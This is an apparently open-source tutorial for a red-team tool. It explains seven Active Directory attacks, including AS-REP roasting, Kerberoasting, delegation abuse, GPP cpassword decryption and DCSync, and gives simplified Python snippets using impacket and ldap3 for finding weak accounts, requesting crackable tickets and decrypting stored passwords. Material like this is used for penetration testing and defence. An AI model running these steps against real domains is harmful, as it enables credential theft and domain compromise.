# RedReason Attack Tutorial

This document explains the active directory attacks implemented in **RedReason** and provides code snippets showing how they are programmatically executed using Python (`impacket` and `ldap3`).

---

## 1. AS-REP Roasting

**Concept**: Users with the `DONT_REQ_PREAUTH` flag enabled do not require Kerberos Pre-Authentication. An attacker can request a TGT for these users and crack the encrypted part of the response (AS-REP) to recover the password.

**Code Snippet (`modules/ad_attacks.py`)**:
```python
def check_asrep_roasting(self):
    # 1. Search for vulnerable users
    # Filter: userAccountControl bit 4194304 (DONT_REQ_PREAUTH)
    search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName'])
    
    for entry in self.conn.entries:
        username = str(entry.sAMAccountName)
        
        # 2. Request TGT without Pre-Auth
        clientName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        # no_preauth=True is key here
        tgt, cipher, _, _ = getKerberosTGT(clientName, '', self.domain, None, None, no_preauth=True)
        
        # 3. Format hash for cracking (hashcat format 23)
        hash_line = f"$krb5asrep$23${username}@{self.domain}:<checksum>$<encpart>"
```

---

## 2. Kerberoasting

**Concept**: Any valid user can request a TGS (Ticket Granting Service) ticket for any service with an SPN (Service Principal Name). The TGS is encrypted with the service account's password hash (NTLM). An attacker can request these tickets and crack them offline.

**Code Snippet (`modules/ad_attacks.py`)**:
```python
def check_kerberoasting(self):
    # 1. Search for users with Service Principal Names (SPNs)
    # Exclude krbtgt account
    search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=krbtgt)))"
    self.conn.search(..., search_filter, attributes=['sAMAccountName', 'servicePrincipalName'])
    
    for entry in self.conn.entries:
        spn = entry.servicePrincipalName[0]
        
        # 2. Authenticate self (Get TGT)
        clientName = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, _, sessionKey = getKerberosTGT(clientName, self.password, self.domain, ...)
        
        # 3. Request TGS for the Target SPN
        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, _, _ = getKerberosTGS(serverName, self.domain, None, tgt, cipher, sessionKey)
        
        # 4. Save TGS-REP hash for cracking
```

---

## 3. Deployment Abuse (Unconstrained)

**Concept**: If a computer is trusted for **Unconstrained Delegation**, any TGT sent to it by a user (e.g., via SMB or HTTP) is stored in memory. If a Domain Admin connects to this machine, their TGT can be harvested.

**Code Snippet (`modules/ad_attacks.py`)**:
```python
def check_delegation_abuse(self):
    # Search Filter for Unconstrained Delegation
    # userAccountControl bit 524288 (TRUSTED_FOR_DELEGATION)
    ud_filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectClass=computer))"
    
    self.conn.search(..., ud_filter, attributes=['dNSHostName'])
    
    for entry in self.conn.entries:
        print(f"VULNERABLE: {entry.dNSHostName}")
        # Reasoning: "Attacker can coerce authentication (e.g. SpoolSample) and capture TGTs."
```

---

## 4. GPP Password Hunting

**Concept**: Older Group Policy Preferences (GPP) stored passwords in "cpassword" fields in XML files within SYSVOL. These were encrypted with a static AES key published by Microsoft (making them effectively cleartext).

**Code Snippet (`modules/ad_attacks.py`)**:
```python
def check_gpp_passwords(self):
    # 1. Connect to SYSVOL via SMB
    smb = SMBConnection(self.target, self.target)
    
    # 2. Walk directories looking for XMLs
    # (Groups.xml, Services.xml, etc.)
    files = smb.listPath('SYSVOL', 'domain/Policies/*') 
    
    # 3. Extract cpassword and decrypt
    # Key is static and public
    GPP_KEY = unhexlify('4e9906e8fcb66cc9faf49310620fe8682ed387d130f429438e9e2448007d136e')
    
    cipher = AES.new(GPP_KEY, AES.MODE_CBC, iv=b'\x00'*16)
    decrypted = cipher.decrypt(base64.b64decode(cpassword))
```

---

## 5. SMB Signing Not Required

**Concept**: If SMB Signing is not required (often on workstations, sometimes servers), an attacker can perform **NTLM Relaying**. They intercept an authentication attempt and relay it to the vulnerable target to execute code or access files.

**Code Snippet (`modules/ad_attacks.py`)**:
```python
def check_smb_signing(self):
    # Check SMB configuration on target
    smb = SMBConnection(self.target, self.target)
    smb.login(self.user, self.password, self.domain)
    
    # Check boolean flag
    if not smb.isSigningRequired():
        print(f"VULNERABLE: SMB Signing NOT required on {self.target}")
        # This target is a valid candidate for ntlmrelayx.py

```
## 6. Resource-Based Constrained Delegation (RBCD)

**Concept**: RBCD allows a computer object to decide which other accounts can delegate to it. This is stored in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (Binary Security Descriptor). If an attacker controls an account listed in this SD, they can gain admin access to the target computer.

**Code Snippet (`modules/ad_attacks.py`)**:
```python
def check_rbcd(self):
    # Filter for objects with the attribute set
    search_filter = "(&(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(objectClass=computer))"
    self.conn.search(..., search_filter, attributes=['msDS-AllowedToActOnBehalfOfOtherIdentity'])
    
    for entry in self.conn.entries:
        raw_sd = entry['msDS-AllowedToActOnBehalfOfOtherIdentity']
        # Parse the Security Descriptor (SD)
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
        for ace in sd['Dacl'].aces:
            sid = ace['Ace']['Sid'].formatCanonical()
            print(f"Principal {sid} can compromise this host via RBCD.")
```

---

## 7. DCSync Rights (ACL Abuse)

**Concept**: The rights `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the Domain Object allow an account to replicate secrets (hashes) from the Domain Controller (DCSync). This is normally restricted to DCs, but sometimes regular users or service accounts are granted this, creating a huge backdoor.

**Code Snippet (`modules/ad_enum.py`)**:
```python
def check_dcsync_rights(self):
    # Get Domain Root SD
    self.conn.search(root_dn, "(objectClass=domain)", attributes=['nTSecurityDescriptor'])
    
    # Parse ACLs looking for specific GUIDs (Simplified View)
    # DS-Replication-Get-Changes: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
    # In practice, this requires careful parsing of ACEs and ObjectTypes.
```
